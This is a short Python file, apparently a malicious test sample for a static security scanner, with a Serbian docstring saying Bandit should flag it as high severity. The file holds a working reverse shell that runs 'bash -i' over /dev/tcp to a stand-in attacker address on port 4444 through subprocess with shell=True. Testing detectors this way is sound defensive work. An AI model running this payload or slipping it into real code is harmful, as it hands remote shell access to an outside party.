"""
MALICIOZAN: reverse shell ka napadačevom hostu preko /dev/tcp.
Treba da bude ODBIJEN u analizi (Bandit B602: shell=True sa promenljivom -> HIGH).
"""
import subprocess

attacker_host = "10.13.37.1"
attacker_port = "4444"
payload = "bash -i >& /dev/tcp/" + attacker_host + "/" + attacker_port + " 0>&1"
subprocess.Popen(payload, shell=True)
